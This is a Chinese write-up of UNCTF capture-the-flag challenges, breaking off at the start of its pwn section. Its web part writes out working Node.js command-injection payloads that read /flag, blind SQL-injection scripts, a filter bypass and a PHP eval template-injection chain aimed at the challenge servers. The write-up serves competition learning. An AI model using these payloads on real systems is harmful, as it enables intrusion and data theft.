> 原文链接: https://www.anquanke.com//post/id/190613 


# UNCTF Write Up


                                阅读量   
                                **1067026**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t014c9b8080cecc582e.jpg)](https://p4.ssl.qhimg.com/t014c9b8080cecc582e.jpg)



## WEB

### <a name="header-n3"></a>帮赵总征婚

呃，帮不了赵总征婚~。

f12，有个hint：

上rockyou字典（不可能的，bp会炸，上top3000），直接爆，得到flag

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01fe0b0209adb8549f.png)

得到flag：flag`{`57fc636a42f46c7658110a631256f5cb`}`

### <a name="header-n10"></a>简单的备忘录

emmm，没学过的语言，进去各种fuzz，

发现打一个字母他就会给些选择

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01b556d8884c351425.png)

最后随缘整出flag

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01a82e3b736dd6d396.png)

flag`{`3ad4aaedf408c147d5f747f7ce76d2b4`}`

### <a name="header-n17"></a>checkin

进入是个聊天框，/name 改名字

/flag 会打印flag1flag1flag1….

/more 显示/flag – 小伙子…

/calc 可以计算，（猜测这里可能有命令执行）

[![](https://p5.ssl.qhimg.com/t01c07d61198ccbf3c5.png)](https://p5.ssl.qhimg.com/t01c07d61198ccbf3c5.png)

找到篇文章https://m.jb51.net/article/91411.htm`

于是试了试里面的payload：/calc require(‘child_process’).exec(‘ls’).toString()

返回了：血小板: [object Object]

然后试了试execSync：/calc require(‘child_process’).execSync(‘ls’).toString()

返回了：bin games include lib local sbin share src命令执行成功

于是读取flag：/calc require(‘child_process’).execSync(‘cat /flag’).toString()

返回：血小板: undefined

应该是空格的问题，那就用$IFS替代：/calc require(‘child_process’).execSync(‘cat$IFS/flag’).toString()

成功拿到flag

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t015673743622d5d679.png)

flag`{`0e4d1980ef6f8a81428f83e8e1c6e22b`}`

### <a name="header-n34"></a>Twice_Insert

刚开始还以为是原题，注册admin’#后改密码，然后用admin登录，发现并没有flag（可恶呢

但是，既然这个二次注入点还在，那仍然是可以被拿来利用的

在单引号和#中间就可以注入语句

各种fuzz后，发现很多函数都被waf了（smarter…harder…大概是有回显的盲注了）

最后，发现了这篇文章https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t017ee419351442a907.png)

于是试着构造payload：

```
"admin' and ascii(substr((select group_concat(distinct database_name)from mysql.innodb_index_stats),1,1))=30###vanish"

"admin' and ascii(substr((select group_concat(distinct table_name)from mysql.innodb_index_stats),1,1))=30###vanish"
```

然后写一个自动化脚本。不断地注册，登录，改密码，然后根据回显按位爆破库、表即可

最终的payload：”admin’ and ascii(substr((select * from fl4g),%d,1))=%d###vanish”%(i,j)

[![](https://p1.ssl.qhimg.com/t0140ff12ae8dcf0041.png)](https://p1.ssl.qhimg.com/t0140ff12ae8dcf0041.png)

得到flag：UNCTF`{`585ae8df50433972bb6ebd76e3ebd9f4`}`（不知道为啥，开头有时候会缺）

### <a name="header-n48"></a>NSB Reset Password

注册-&gt;改密码：发验证码-&gt;重置密码

三个包抓过来，发现sessionID都没有变动过。

试着猜想这个改密码的逻辑：当我给自己的账户发邮件，然后输入验证码，验证通过后，这个sessionID就获得了更改密码的权利，但是是更改谁的密码呢？账户的信息想必是存在sessionID里的。

但经过测验，无论是给admin发邮件，还是给自己发邮件，sessionID都没有变过。那么，显然sessionID里的储存的账户信息的那部分是可以被覆盖的，所以解题流程：

先注册-&gt;更改密码：发送验证码-&gt;到重置密码的界面，此时再开一个窗口，发送更改admin密码的邮件（sessionID里的用户被覆盖为admin），然后又回去，更改密码（此时更改的就是sessionID里的账户，即admin的密码），然后用自己更改的密码登录admin账户即可获flag

[![](https://p5.ssl.qhimg.com/t01ba8c30adb43d2d38.png)](https://p5.ssl.qhimg.com/t01ba8c30adb43d2d38.png)

flag：flag`{`175f3098f80735ddfdfbd4588f6b1082`}`

### <a name="header-n56"></a>easy_admin

很容易发现在/index.php?file=forget这里存在注入

fuzz后发现过滤了and select where。。。

然后卡了好久不知道怎么查admin的密码，最后索性直接 password （bugku有一道过滤很严的题就是这样bypass，）

exp：

```
import requests

url = "http://101.71.29.5:10045/index.php?file=forget"

r = requests.Session()

password=""
for i in range(1,40):
    for j in range(ord('0'),ord('`}`')):
        data = `{`
            "username":"-1'or ascii(substr((password),%d,1))=%d#"%(i,j)
        `}`

        res = r.post(url, data=data)
        #print res.text
        if "ok reset password" in res.text:
            password = password + chr(j)
            print password
            break
```

得到密码：

[![](https://p1.ssl.qhimg.com/t01276c1041f642fd59.png)](https://p1.ssl.qhimg.com/t01276c1041f642fd59.png)

登录后yes you are admin, but you can’ to get the flag, because admin will access the website from

from where？

盲猜是127.0.0.1，然后再报文头加一个Referer，得到后一半flag

[![](https://p4.ssl.qhimg.com/t01cf6314a828f8eeed.png)](https://p4.ssl.qhimg.com/t01cf6314a828f8eeed.png)

flag：flag`{`nevertoolatetox`}`

### <a name="header-n69"></a>Bypass

php的正则有点小漏洞，两个斜杠丢进php只剩一个斜杠了，然后这个斜杠丢进正则就用来转义了

而这一题，出题人似乎是给了个hint

[![](https://p3.ssl.qhimg.com/t01b0ca65aa5a902b40.png)](https://p3.ssl.qhimg.com/t01b0ca65aa5a902b40.png)

这里故意换了下位置。

所以自己做了下实验，发现，由于这个小漏洞，a被过滤了|*而不是*，b被过滤了|\n，而不是被过滤了\n

```
&lt;?php
//highlight_file(__FILE__);
$a = $_GET['a'];
$b = $_GET['b'];
// try bypass it
if (preg_match("/\'|\"|,|;|\`|\\|\*|\n|\t|\xA0|\r|\`{`|\`}`|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is", $a))`{`
    $a="";
    echo"waf-a\n";`}`

if (preg_match("/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\`{`|\`}`|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is", $b))`{`
    $b="";
    echo"waf-b";`}`
echo $a;
print "&lt;br&gt;";
echo $b;
```

[![](https://p4.ssl.qhimg.com/t010bbbade7d82cfd04.png)](https://p4.ssl.qhimg.com/t010bbbade7d82cfd04.png)

[![](https://p2.ssl.qhimg.com/t0158c3f445ebc19a10.png)](https://p2.ssl.qhimg.com/t0158c3f445ebc19a10.png)

同时，a,b就都可以用斜杠了，

于是就可以闭合引号后任意命令执行

对于命令的过滤有两种绕过方法，一个是linux下，用通配符?绕过，比如var写成v?r

解题：
1. http://101.71.29.5:10054/?a=\&amp;b=%0al\s%20/%0a1. flag不在根目录下，那就找找，- http://101.71.29.5:10054/?a=\&amp;b=%0afin\d%20/va?/???/htm?/%0a1. 找到了- http://101.71.29.5:10054/?a=\&amp;b=%0aca\t%20/va?/???/htm?/.F1jh_/h3R3_1S_your_F1A9.txt%0a
[![](https://p4.ssl.qhimg.com/t011ea19b8dc163f851.png)](https://p4.ssl.qhimg.com/t011ea19b8dc163f851.png)

flag：unctf`{`86dfe85d7c5842c5c04adae104193ee1`}`

### <a name="header-n97"></a>审计一下世界上最好的语言吧

先丢进Seay

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01750cb1862de2f113.png)

parse_template.php中有一个eval

查一下调用关系：

```
index.php：parse_again($searchword);

parse_template.php:

function parse_again()`{`
    global $template_html,$searchword;
    $searchnum    = isset($GLOBALS['searchnum'])?$GLOBALS['searchnum']:"";
    $type      = isset($GLOBALS['type'])?$GLOBALS['type']:"";
    $typename = isset($GLOBALS['typename'])?$GLOBALS['typename']:"";


    $searchword = substr(RemoveXSS($searchword),0,20);
    $searchnum = substr(RemoveXSS($searchnum),0,20);
    $type = substr(RemoveXSS($type),0,20);
    $typename = substr(RemoveXSS($typename),0,20);
    $template_html = str_replace("`{`haha:searchword`}`",$searchword,$template_html);
    $template_html = str_replace("`{`haha:searchnum`}`",$searchnum,$template_html);
    $template_html = str_replace("`{`haha:type`}`",$type,$template_html);
    $template_html = str_replace("`{`haha:typename`}`",$typename,$template_html);
    $template_html = parseIf($template_html);
    return $template_html;
`}`

function parseIf($content)`{`
    if (strpos($content,'`{`if:')=== false)`{`
            return $content;
    `}`else`{`
        $Rule = "/`{`if:(.*?)`}`(.*?)`{`end if`}`/is";
        preg_match_all($Rule,$content,$iar);
        $arlen=count($iar[0]);
        $elseIfFlag=false;
        for($m=0;$m&lt;$arlen;$m++)`{`
            $strIf=$iar[1][$m];
            $strIf=parseStrIf($strIf);
            @eval("if(".$strIf.") `{` \$ifFlag=true;`}` else`{` \$ifFlag=false;`}`");
        `}`
    `}`
    return $content;
```

然后看到template.html，搜索searchword和searchnum

```
&lt;h4&gt;&lt;span class="glyphicon glyphicon-film sea-text"&gt;&lt;/span&gt; &lt;a href="#"&gt;`{`haha:searchword`}` &lt;/a&gt; &lt;small&gt;共有&lt;span class="sea-text"&gt;`{`haha:searchnum`}`&lt;/span&gt;个影片 第&lt;span class="sea-text"&gt;`{`searchlist:page`}`&lt;/span&gt;页&lt;/small&gt;&lt;/h4&gt;
```

最后再看看RemoveXSS

发现 if:,

解题思路：

首先利用四次的strreplace绕过RemoveXss,控制$templatehtml

然后是绕过判断和正则：`{`if:开头、`{`end if`}`结尾，然后真正执行的命令要在rule匹配到的第一个（.*?）

破题：

```
$searchnum=`{`end if`}`

$searchword=`{`if`{`haha:type`}`

$type=:read`{`haha:typename`}`

$typename=file(%27flag.php%27)`}`
```

这样content被替换为

```
&lt;h4&gt;&lt;span class="glyphicon glyphicon-film sea-text"&gt;&lt;/span&gt; &lt;a href="#"&gt;`{`if:readfile(%27flag.php%27)`}`&lt;/a&gt; &lt;small&gt;共有&lt;span class="sea-text"&gt;`{`end if`}`&lt;/span&gt;个影片 第&lt;span class="sea-text"&gt;`{`searchlist:page`}`&lt;/span&gt;页&lt;/small&gt;&lt;/h4&gt;
```

正则过后$iar为

```
Array
(
    [0] =&gt; Array
        (
            [0] =&gt; `{`if:readfile(%27flag.php%27)`}`&lt;/a&gt; &lt;small&gt;共有&lt;span class="sea-text"&gt;`{`end if`}`
        )

    [1] =&gt; Array
        (
            [0] =&gt; readfile(%27flag.php%27)
        )

    [2] =&gt; Array
        (
            [0] =&gt; &lt;/a&gt; &lt;small&gt;共有&lt;span class="sea-text"&gt;
        )
)
```

然后$strIf被赋值为readfile(%27flag.php%27)

然后 @eval(“if(readfile(%27flag.php%27)) `{` $ifFlag=true;`}` else`{` $ifFlag=false;`}`”);

readlfile输出flag

最终payload：

```
searchnum=`{`end if`}`&amp;content=&lt;search&gt;`{`if`{`haha:type`}`&lt;/search&gt;&amp;type=:read`{`haha:typename`}`&amp;typename=file(%27flag.php%27)`}`
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a43546f5bc598ac5.png)

flag：UNCTF`{`5ee25610af306b625b4cadb4cb5fa24b`}`



## RE

### <a name="header-n130"></a>666

逆向签到题，

主要函数

[![](https://p0.ssl.qhimg.com/t01acfae537b2029f57.png)](https://p0.ssl.qhimg.com/t01acfae537b2029f57.png)

然后找到一些关键值，再根据加密逻辑写解密脚本即可

```
exp：

cipher='''izwhroz""w"v.K".Ni'''
key=0x12
flag=''
for i in range(0,len(cipher),3):
    flag+=chr((ord(cipher[i])^key)-6)
    flag+=chr((ord(cipher[i+1])^key)+6)
    flag+=chr((ord(cipher[i+2])^key)^6)
print flag
```

得到flag：unctf`{`b666b666b`}`

### <a name="header-n138"></a>神奇的数组

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01b1b5242af8d6740b.png)

打开主函数，读一下程序逻辑，结合大小端存储顺序。好的，flag就是checkbox里照抄。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01ea30e449f32cf1a9.png)

flag：ad461e203c7975b35e527960cbfeb06c

### <a name="header-n143"></a>BabyXor

手动脱壳+动调，直接出flag23333

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01243cb805fa8ffd23.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01e0f7ec207dfc09cb.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01f7bcda3fa207272c.png)

flag：flag`{`2378b077-7d6e-4564-bdca-7eec8eede9a2`}`

### <a name="header-n149"></a>unctfeasyMaze

解法一：ida反汇编后程序逻辑就是对地图进行了两次初始化，然后就是正常走迷宫了

将断点设置在地图第二次初始化完成后，然后查看RSI的值

[![](https://p1.ssl.qhimg.com/t01737c26b1931378a3.png)](https://p1.ssl.qhimg.com/t01737c26b1931378a3.png)

7个一行排列

[![](https://p2.ssl.qhimg.com/t01e30cd9bab6cc1578.png)](https://p2.ssl.qhimg.com/t01e30cd9bab6cc1578.png)

走完即可得到flag

[![](https://p4.ssl.qhimg.com/t01e559eb7eb446c594.png)](https://p4.ssl.qhimg.com/t01e559eb7eb446c594.png)

flag：UNCTF`{`ssddwdwdddssaasasaaassddddwdds`}`

解法二：爆破

运行了程序后发现可以一步一步走，一旦走错就会报错

于是可以按位爆破，最多也就是试4*29次，很快的。。。（至少比misc那个走迷宫要快）



## MISC

### <a name="header-n163"></a>信号不好我先走了

下载得到图片，看了十六进制没有隐藏东西，于是用神器Stegsolve试一波LSB

[![](https://p3.ssl.qhimg.com/t018175cd593a8bf85d.png)](https://p3.ssl.qhimg.com/t018175cd593a8bf85d.png)

果然有东西，藏了一个zip包。

保存下来解压缩得到一个张跟之前一样的图片。

盲猜盲水印，工具一把梭，得到

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t012729ab73729c051f.png)

flag：unctf`{`9d0649505b702643`}`

### <a name="header-n171"></a>亲爱的

原以为是mp3隐写，然而没有密码。

看十六进制数据发现有一个zip包在底下，

然后注释有提示

根据提示，和歌名，在qq音乐 海阔天空 李现 的评论区，在对应评论时间找到密码：真的上头

解压得到一张图片，看十六进制数据，底下隐写了一个word文档，

word打开，发现右下角有端倪，是图片一角，拖出来得到flag

（或者直接把word文档当zip打开，在word文件夹中的media文件夹中也有flag 的图片）

[![](https://p1.ssl.qhimg.com/t01b72be95beef42f94.png)](https://p1.ssl.qhimg.com/t01b72be95beef42f94.png)

flag：UNCTF`{`W3L0v3Unctf`}`

### <a name="header-n181"></a>快乐游戏题

终于出现了签到题，玩游戏得flag

[![](https://p2.ssl.qhimg.com/t0169f0bdcad13d39a6.png)](https://p2.ssl.qhimg.com/t0169f0bdcad13d39a6.png)

flag：UNCTF`{`c783910550de39816d1de0f103b0ae32`}`

### <a name="header-n185"></a>Happy Puzzle

手撕PNG呗，提示里的RGB没管，400*400比较有用，

最基本的PNG组成：文件头，IHDR，IDAT（len(data)+’IDAT’+data+crc），IEND，和随处可见的crc32校验（这玩意儿坑惨我了）

用windows比较方便的是，crc不用算，用0占位即可，IEND也可以不用加

解题过程：
1. 随便找个PNG，拿到png文件头+IHDR的数据
1. 改宽高
1. 给所有data文件，前面接上len(data)，即00002800，IDAT，再给末尾加上00000000占crc32的位
1. 做出26张图，看哪张图有图像，然后以此类推的再往后加data- 结果：
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01ebe3f81bfa8ebd96.png)

贴上半自动exp：

```
import os
head='89504e470d0a1a0a0000000d494844520000019000000190080200000000000000'
idata='0000280049444154'
crc="1bad748e"
with open(filename,"rb") as f:
       data = f.read().encode("hex")
rootdir = ''
list = os.listdir(rootdir) 
for i in range(0,len(list)):
       path = os.path.join(rootdir,list[i])
       if os.path.isfile(path) and path[-5:]=='.data':
              with open(path,"rb") as f:
                     txt = f.read()
                     txt=data+idata+txt.encode("hex")+crc
              with open(path.replace("puzzle","puzzle2").replace("data","png"),"wb") as f:
                     f.write(txt.decode('hex'))
```

flag：ucntf`{`312bbd92c1b291e1827ba519326b6688`}`

### <a name="header-n203"></a>think

用python的匿名函数一句话制作出的题目

[![](https://p4.ssl.qhimg.com/t01005759a8be9dcc16.png)](https://p4.ssl.qhimg.com/t01005759a8be9dcc16.png)

关键在这里，check函数判断checknum，如果checknum为1，就打印(__print(‘Congratulation!’), (__print(decrypt(key, encrypted)),猜测后面半部分就是flag

于是，直接运行代码，然后在IDLE里键入check(1)，得到flag

[![](https://p5.ssl.qhimg.com/t0115f99ae8df9d03eb.png)](https://p5.ssl.qhimg.com/t0115f99ae8df9d03eb.png)

flag:flag`{`34a94868a8ad9ff82baadb326c513d40`}`

### <a name="header-n211"></a>Hidden secret

下载拿到三个里面全是十六进制的文件

看到03 04 05 06 01 02

就意识到这三个是被去掉了50 4B的zip包的三段数据

用010editor拼接起来后得到一个压缩包，里面是一个图片

用010editor打开图片后底下藏了一个zip包

解压得到一串密文：”K&lt;jslc7b5’gBA&amp;]_5MF!h5+E.@IQ&amp;A%EExEzp\X#9YhiSHV#”

base全家桶走一遍，最后确定是base92

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0183d046de0ef60b68.png)

得到flag：unctf`{`cca1a567c3145b1801a4f3273342c622`}`

### <a name="header-n221"></a>EasyBox

nc连上后是个数独题，不过是非常规的，只需要行和列不重复即可

魔改了个大佬的脚本：https://blog.csdn.net/zonnin/article/details/78813698

```
import itertools
from pwn import *
context.log_level='debug'
sh = remote('101.71.29.5',10011)

content = sh.recvuntil("answer :\n")[339:718].replace("\n","").split("+-+-+-+-+-+-+-+-+-+")
sudoku=[]
for i in content:
    if i!="":
        sudoku.append(i.replace(" ","0")[1:-1].split("|"))
#print sudoku

def find_index(s):
    flag=list()
    for i in range(9):
        row=[]
        for j in range(9):
            if s[i][j]=='0':
                row.append(1)
            else:
                row.append(0)
        flag.append(row)
    return flag
                
                
def not_done(s):
    return True in [0 in r for r in s]

def get_row(s, r):
    return s[r]

def get_column(s, c):
    return [r[c] for r in s]



def get_possible(s, r, c):
    return [i for i in range(1, 10) \
                if i not in get_row(s, r) \
                and i not in get_column(s, c)]

def go_around(s):
    ans = []
    for index_r, r in enumerate(s): #row_index and row
        row = []
        for index_c, c in enumerate(r): #each in row
            c=int(c)
            if 0 == c:
                maybe_ans = get_possible(s, index_r, index_c)
                row.append(maybe_ans[0] if len(maybe_ans) == 1 else 0)
            else:
                row.append(c)
        ans.append(row)
    return ans

def print_sudoku(s, msg):
    print msg
    for r in s:
        print " ".join([str(c) for c in r])
    print "*"*18



    
#print_sudoku(sudoku, "initializing...")
FLAG=find_index(sudoku)
counter=0
sudoku = go_around(sudoku)
#print_sudoku(sudoku, "Round "+ str(counter) + " :")
#counter += 1

while not_done(sudoku):
    sudoku = go_around(sudoku)
    #print_sudoku(sudoku, "Round "+ str(counter) + " :")
   # counter += 1
answer=""
for i in range(9):
    if FLAG[0][i] == 1:
        answer+=str(sudoku[0][i])+","
answer=answer[:-1]
sh.sendline(answer)
#print answer
for i in range(1,9):
    answer=""
    sh.recvuntil("answer :")
    for j in range(9):
        if FLAG[i][j]==1:
           answer+=str(sudoku[i][j])+","
    answer=answer[:-1]
    sh.sendline(answer)
    #print answer
sh.interactive()
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01085b7d87603dfcf5.png)

得到flag：flag`{`b613e841e0822e2925376d5373cbfbc4`}`



## CRYPTO

### <a name="header-n228"></a>不仅仅是RSA

下载附件得到五个文件，

两个音频文件，看波形图，是摩斯密码，解密得到c1,c2

两个pem文件，用openssh打开得到两个模n和相同的e

根据加密脚本得知两个n有公约数

所以已知e p q

基础rsa解密，

exp：

```
from gmpy2 import *

def GCD(a, b):

    while b:
        a, b = b, a%b
    return a



c1=4314251881242803343641258350847424240197348270934376293792054938860756265727535163218661012756264314717591117355736219880127534927494986120542485721347351
c2=485162209351525800948941613977942416744737316759516157292410960531475083863663017229882430859161458909478412418639172249660818299099618143918080867132349

e=mpz(41221)

n1=int('0xC461B3ED566F2D68583019170BDD5263D113BAECE3DEE6631F08A166376AC41FF5D4E90B3330E0FC26993E3B353F38F9B6B880DFBC5807636497561B7611047B',16)

n2=int('0xA36E3A2A83FE2C1E33F285A08C3ECD36E377F4D9FFE828E2426D3ECED0A7F947631E932AEC327555511AC6D71E72686C1CB7DBBF3859A4D9A3D344FBF12A9553',16)

#q=GCD(n1,n2)
q = mpz(95652716952085928904432251307911783641637100214166105912784767390061832540987)
print n2/q
p1 = mpz(107527961531806336468215094056447603422487078704170855072884726273308088647617)
p2 = mpz(89485735722023752007114986095340626130070550475022132484632643785292683293897)
assert p1*q==n1
assert p2*q==n2
d1 = invert(e,(p1-1)*(q-1))
d2 = invert(e,(p2-1)*(q-1))

m1 = hex(pow(c1,d1,n1))[2:].decode('hex')
m2 = hex(pow(c2,d2,n2))[2:].decode('hex')
print m1,m2
```

flag：UNCTF`{`ac01dff95336aa470e3b55d3fe43e9f6`}`

### <a name="header-n238"></a>一句话加密

拿到文件，python文件里没有啥，正常的rsa加密，

然后用010editor打开另外一张图片，发现底下有内容

[![](https://p4.ssl.qhimg.com/t016ad124e2ec4f7898.png)](https://p4.ssl.qhimg.com/t016ad124e2ec4f7898.png)

猜测那个大数是n，先拿去分解一波，发现可行

[![](https://p0.ssl.qhimg.com/t01ecb1e951aebdcb5a.png)](https://p0.ssl.qhimg.com/t01ecb1e951aebdcb5a.png)

但是，e呢？

突然，发现被分解出来的p和q很熟悉

上V爷爷博客！[https://veritas501.space/2017/03/01/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/](https://veritas501.space/2017/03/01/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/)

p、q出现在V爷爷的Rabin密码的脚本里，那么这题就是Rabin密码了，，

那么直接上V爷爷脚本

```
import gmpy2

def n2s(num):
    t = hex(num)[2:]
    if len(t) % 2 == 1:
       return ('0'+t).decode('hex')
    return t.decode('hex')

def decode(c):
    p = 275127860351348928173285174381581152299
    q = 319576316814478949870590164193048041239
    n = p*q
    r = pow(c,(p+1)/4,p)
    s = pow(c,(q+1)/4,q)
    a = gmpy2.invert(p,q)
    b = gmpy2.invert(q,p)
    x =(a*p*s+b*q*r)%n
    y =(a*p*s-b*q*r)%n
    print n2s(x%n)
    print n2s((-x)%n)
    print n2s(y%n)
    print n2s((-y)%n)

c1=62501276588435548378091741866858001847904773180843384150570636252430662080263

c2=72510845991687063707663748783701000040760576923237697638580153046559809128516

decode(c1)
decode(c2)
```

[![](https://p4.ssl.qhimg.com/t01ddf73d4040ed8c6f.png)](https://p4.ssl.qhimg.com/t01ddf73d4040ed8c6f.png)

运行得到flag：unctf`{`412a1ed6d21e55191ee5131f266f5178`}`

### <a name="header-n252"></a>ECC和AES基础

参考https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/discrete-log/ecc-zh/

将底下的脚本的数据替换下

```
G=E(6478678675, 5636379357093)
pub = E(2854873820564,9226233541419)

c1 = E(6860981508506,1381088636252)
c2 = E(1935961385155, 8353060610242)

X = G

for i in range(1, 3000000):
    if X == pub:
        secret = i
        print "[+] secret:", i
        break
    else:
        X = X + G
        print i

m = c2 - (c1 * secret)

print "[+] x:", m[0]
print "[+] y:", m[1]
print "[+] x+y:", m[0] + m[1]
```

爆破得到secret=2019813

```
x=1559343440829
 y=7468915163961
```

x即为aes_key

```
from Crypto.Cipher import AES
import base64


key = bytes('1559343440829'.ljust(16,' '))
aes = AES.new(key, AES.MODE_ECB)  
data=base64.b64decode('/cM8Nx+iAidmt6RiqX8Vww==')
ans = aes.decrypt(data)
print ans
```

发现并不能解出来

这里有点小坑，C1和C2位置互换了

于是重新跑第一个脚本，C1和C2的值互换，secret之前已经爆破出来了

得到 x=1026

AES解密得

thisisa_flag

然后去目标url post

得到

[![](https://p0.ssl.qhimg.com/t017274e33bae69e881.png)](https://p0.ssl.qhimg.com/t017274e33bae69e881.png)

flag：401E48C9A96DC219C32AB5E75204B655



## PWN

### <a name="header-n271"></a>Sosoeasypwn

原本想泄露canary，后无意间发现，eip竟然被覆盖了，于是手测，发现输入12个a后即可控制eip。（这里输入了12个a和3个b加1个回车，可见eip被覆盖成了bbb\n）

[![](https://p4.ssl.qhimg.com/t010c37e6c8bbb1b6b1.png)](https://p4.ssl.qhimg.com/t010c37e6c8bbb1b6b1.png)

IDA静态分析发现，是两个函数调用了同一个栈，然后栈内数据没清理，导致部分数据被重用

